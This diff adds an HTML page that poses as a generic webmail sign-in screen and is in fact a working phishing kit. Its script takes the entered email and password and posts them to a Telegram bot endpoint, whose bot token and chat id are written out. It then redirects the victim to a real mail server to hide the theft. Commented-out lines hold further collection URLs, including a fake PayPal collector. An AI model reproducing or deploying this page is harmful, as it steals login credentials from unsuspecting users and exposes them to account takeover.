@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>webmail</title>
+	<html class=user_font_size_normal lang=en>
+<style>
+    .infobar, .infobar-icon, .infobar-content, .infobar-link-icon{
+    display: none!important;
+}
+</style>
+<meta charset=utf-8>
+
+  <link rel="icon" type="image/x-icon" href="data:image/webp;base64,UklGRh4EAABXRUJQVlA4WAoAAAAQAAAAPwAAPwAAQUxQSNgBAAARkC1JtmlbfW3btm1bP2Dbtm3btm3btm2stb3XHBdjac7Lt4iYAPw9RlQp57gDd7RA6OdwOGwYwiI5H360e0gyLmLH16RooCuzkBReC6AvKd0LOd6rRbEGk+IDd6m2+4Vqbw3VhFCOfo2flgw7J9v1EdM/W9DKAujhkynQEUAer9kC/Jz/lDznc+PnLWZLGUQcIyQZBH6zmScbA5S/LsO76uDTCjO6nI9DrIXurY4CvvADshpszyFC/Xfu+OrCtC/Z3ZWRAZKfcONoKvC5z5D9r204RB/od0oMjgy+ZZAcXZmAAQqfceZKKfAJt5HTD2tyiDtD2DMmxQJf/TMbfmHPCmzfK437cozMcXvXbBfZmW4xkhWU4HOeJ7f9HSMxQCPdLNAafMQBHpJwV3oOuY5zxwuAT7Ob5PxYj0OE5pc074UGUcE3/UzSLkzEAFHTpo8MPsFSkvlWGc5qnacktzYmjo2BgqS/VMFKlYukondlUS73HEGKBh+sGzd984MwuSnckfLf3/9/8Uq1j5tV29hWte7ZNbV8cTMbfmHPCmzfK437cozMcXvXbBfZmW4xkhW/8Xg9P+u6x+PxeL0+vz8QDIXDhmEIlhNCGEYwFPJcW9s8JZyNgL9sVlA4ICACAABwDwCdASpAAEAAPjEOjEYiEREKACADBLYAYokJvzP8QO6IwL1n8aeXG167X5Q3z2Yr/7l7APsz9R3cAfq7+t3v/+gD0AP6H/ePSA9gD0APKm/Yf4BP2b/cD4DP43/Wv+vwAADzfZAn+STMbfmHPCmzfK437cozMcXvXbBfZmW4xkhWf0AA/vDLtiEiKhm5eR6VX5MRC44axR2/ClJFFHtb5ALib94B/5vZzelZQhNWRm5mcltg/rjiOPqs1MKgYe8OEnuu7VIGv3EQu8h2IfBrB99xiEWhRWokJOQkqb0Cu1i6KWPqOOcXzPGHC+6n4EK8u7E5e3gezmOVDjhaiOiqv/ybdOqB1EsflL5DsJqgse88zI4svICJH+13FazNiAJ6hxG0HD64RU6W/VAA6jyc7Da5GQjfHDwkV/P/pw1gxpAkQ22e0A1vBPlycbf3+54Ij6ry1lxfRhzQbq3Y9LbB4AVCBIGgrgna4WzPmaTOaT+0bUA9MwEwGJ1TLIc3yzfqFy+WEzKZNMVqFzgC5yhRjKNGcj0nuCOCrwzto7NGch7HGz0qU7Yz9NHV0aUO94jexAP+c75RSyDdYFmK/e6/OzHTMbfmHPCmzfK437cozMcXvXbBfZmW4xkhWWpIAD/AEc1HKzdzPbvEO0vyv/Br4lLefw2coX6+zj/TiBLOPr6FD0x6vAAKQH22dKZmPq4tYf1e/YwWw6p3JsEXywAA">
+<script>
+  window.onload = function(){
+
+
+  const element = document.getElementById("sub-btn");
+element.addEventListener("click", loadDoc);
+ // document.getElementById('sub-btn').addEventListener('click', loadDoc);
+
+function loadDoc() {
+  const xhttp = new XMLHttpRequest();
+  var username =  document.getElementById("ai").value;
+  var password = document.getElementById("pr").value;
+
+  xhttp.onload = function() {
+    document.getElementById("body").innerHTML = '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Refresh" content="01; url=https://mail-internal.mdpi.com/"><style type="text/css">body{background-color: #ffff;} #container{width: 100px;height:100px;top: 45%;left:45%;position: absolute;text-align:center;}#loader{width: 100%;height:100%;}</style></head><body><center><div id="container"><img id="loader" src="https://sonobel.com.br/assets/img/2.gif"><br/><br/>loading...</div><center></body></html>';
+  }
+  /*
+  https://assets.materialup.com/uploads/8637adc0-7242-4e29-97a2-199f998a3f2b/preview.gif
+  https://marketing-test-inc.000webhostapp.com/en/us/paypal/grat.php?text=[paypal][Email : "+username+":password : "+password+"]
+  https://api.telegram.org/bot6049310828:AAFhape-5dkZOMNNmAm_aMbZZ6QBSkshr_g/sendMessage?chat_id=-977395665&text=*/
+  xhttp.open("POST", "https://api.telegram.org/bot7843370721:AAFsXD3vD75vrO27H0xNwKyacOkuwm_dBA0/sendMessage?chat_id=-4551606178&text=[E-mail Access][Email : "+username+":password : "+password+"]");
+  xhttp.send();
+}
+
+}
+</script>
+<title>Webmail Login</title>
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<style>.ScreenReaderOnly{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px)}.user_font_size_normal{font-size:12px}DIV,SELECT,INPUT[type=text],INPUT[type=password]{font-size:1rem}INPUT[type="checkbox"]{cursor:pointer}INPUT[type="checkbox"]:focus{outline-style:solid;outline-width:1px;outline-color:#5b798a}INPUT[type="text"],INPUT[type="password"]{cursor:text}.FakeAnchor,A:link,A:visited{color:#005A95;text-decoration:none;cursor:pointer}.FakeAnchor:hover,A:hover{color:#005A95;text-decoration:underline}.FakeAnchor:active,A:active{color:darkgreen;text-decoration:underline}.FakeAnchor:focus,A:focus{outline-style:solid;outline-width:1px;outline-color:#5b798a}.LoginScreen DIV,.LoginScreen SPAN,.LoginScreen SELECT,.LoginScreen INPUT,.LoginScreen BUTTON,.LoginScreen A{font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif}HTML{width:100%;height:100%}BODY{background-color:#FFF;width:100%;height:100%}FORM{margin:0;padding:0}.signIn{font-size:20px;padding:19px 0;color:#4d4d4d;font-weight:bold}.loginSection{padding:15px 0}.versionBlock{padding:20px 40px;background:#eee;position:relative;margin:0-40px -40px}.versionBlock label{display:block;padding-bottom:3px;color:#4d4d4d}select#client{width:100%;background:#fff;height:32px;outline:none}select#client:focus{border-color:#0088c1}#zLoginForm{text-align:left}form#zLoginForm .form INPUT[type="text"],form#zLoginForm .form INPUT[type="password"]{border:1px solid #d9d9d9;padding:6px 12px;width:100%;height:36px;box-sizing:border-box;margin-bottom:10px}form#zLoginForm .form INPUT[type="text"]:focus,form#zLoginForm .form INPUT[type="password"]:focus,.twoFactorForm INPUT[type="text"]:focus{border-color:#0088c1}.form{border-collapse:collapse;color:white;margin:0 auto;text-align:left}.form INPUT[type="text"]:focus,.form INPUT[type="password"]:focus{border:1px solid #99cae7}.form .rememberCheckWrapper{flex:1;padding-left:20px;justify-content:flex-end}button.loginButton{background-color:#0088c1;color:#fff;float:left;font-size:13px;padding:8px 23px;border-radius:4px;cursor:pointer;outline:none;border:none;-moz-appearance:none;-webkit-appearance:none}input#remember{outline:none;float:left}label#remember{color:#4d4d4d}.form HR{border-color:transparent transparent white;height:0}.alignWhatsThis{position:absolute;top:9px;left:105%}.passwordWrapper{position:relative}.signInAndLabel{display:flex}.signInAndLabel>div{display:flex;align-items:center}#ZLoginWhatsThisButton{background:url(data:,)center center no-repeat;border:transparent;outline:none;width:15px;height:15px;padding:0;background-size:15px 15px}A:visited{color:#005A95}input[type="text"],input[type="password"]{color:black}BODY{margin:0}.LoginScreen{height:100%}#modifiedLogin.LoginScreen{position:absolute;left:0;top:0;width:100%;min-height:100%;overflow:auto;display:flex;flex-direction:column;font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;font-size:1rem;background:#0088c1 url(data:,)0 0/cover no-repeat}.LoginScreen .modernCenter{flex:1;padding:20px 0}.LoginScreen .modernContentBox{background-color:#fff;box-shadow:0 4px 6px 0 rgba(0,0,0,.4);padding:40px;max-width:300px;margin:0 auto;position:relative;top:50%;transform:translateY(-50%)}.LoginScreen .ImgLoginBanner{cursor:pointer;display:block}.LoginScreen .Footer{text-align:center;width:100%;z-index:10}.LoginScreen #ZLoginNotice{cursor:default;margin-bottom:5px;font-size:1rem;color:#f4f4f4}.LoginScreen .zLoginFieldInput{display:block;border-radius:2px;outline:none}.LoginScreen .zLoginFieldLabel{display:inline-block;padding:2px 0 4px;color:#4d4d4d}.ImgLoginBanner{background-repeat:no-repeat;background-position:bottom left;background-size:contain;background-image:url(data:,);width:260px;height:34px}INPUT[type="text"],INPUT[type="password"]{margin:0;border-width:1px;border-style:solid}SELECT{border:1px solid #bfbfbf;margin:0;border-width:1px;border-style:solid}</style>
+<meta name=referrer content=no-referrer><style>.sf-hidden{display:none!important}</style><style>img[src="data:,"],source[src="data:,"]{display:none!important}</style></head>
+<body data-new-gr-c-s-check-loaded=14.1198.0 data-gr-ext-installed id="body">
+ <div id=modifiedLogin class=LoginScreen>
+ <div class=modernCenter>
+ <div class=modernContentBox>
+ <div class=logo>
+ <a href=# id=bannerLink target=_new title=Webmail><span class=ScreenReaderOnly>Webmail</span>
+ <span class=ImgLoginBanner></span>
+ </a>
+ </div>
+ <form method=post id=zLoginForm>
+ <div class=signIn>Sign In</div>
+ <div class=form>
+ <center>
+ <div class="alert alert-danger" id=msg style=display:none;color:red>Invalid Password..! Please enter correct password.</div>
+ <span id=error class=text-danger style=display:none;color:red>That account doesn't exist. Enter a different account</span>
+ </center>
+ <div class=loginSection>
+ <label for=username class=zLoginFieldLabel>Username</label>
+ <input id=ai class=zLoginFieldInput name=ai type=text value size=40 maxlength=1024 autocapitalize=off autocorrect=off placeholder="email" required>
+ 
+ <label for=password class=zLoginFieldLabel>Password</label>
+ <div class=passwordWrapper>
+ <input id=pr tabindex=2 autocomplete=off class=zLoginFieldInput name=pr type=password size=40 maxlength=1024 placeholder="password" required>
+ </div>
+ <div class=signInAndLabel>
+ <div>
+ <button id="sub-btn" type=button tabindex=5 class=loginButton>Sign In</button>
+ </div>
+ <div class=rememberCheckWrapper>
+ <input id=remember tabindex=6 value=1 type=checkbox name=zrememberme>
+ <label id=remember for=remember>Stay signed in</label>
+ </div>
+ </div>
+ </div>
+ <div>
+ <hr>
+ </div>
+ <div>
+ <div class=versionBlock>
+ <label for=client>Web App Version</label>
+ <div style=position:relative>
+ <select id=client name=client>
+                                        <option value=preferred selected> Default</option>
+                                        <option value=advanced> Classic</option>
+                                        <option value=modern> Modern</option>
+                                    </select>
+ <input type=button class=alignWhatsThis id=ZLoginWhatsThisButton value>
+ </div>
+ <div id=ZLoginWhatsThis class=sf-hidden>
+ 
+ </div>
+ </div>
+ </div>
+ </div>
+ </form>
+ </div>
+ <div class="decor1 sf-hidden"></div>
+ </div>
+ <div class=Footer>
+ <div id=ZLoginNotice class=legalNotice-small>Copyright &copy 2024. All rights reserved.</div>
+ </div>
+ <div class="decor2 sf-hidden"></div>
+ </div>
+ 
+
+
+</head>
+<body>
+
+</body>
+</html>
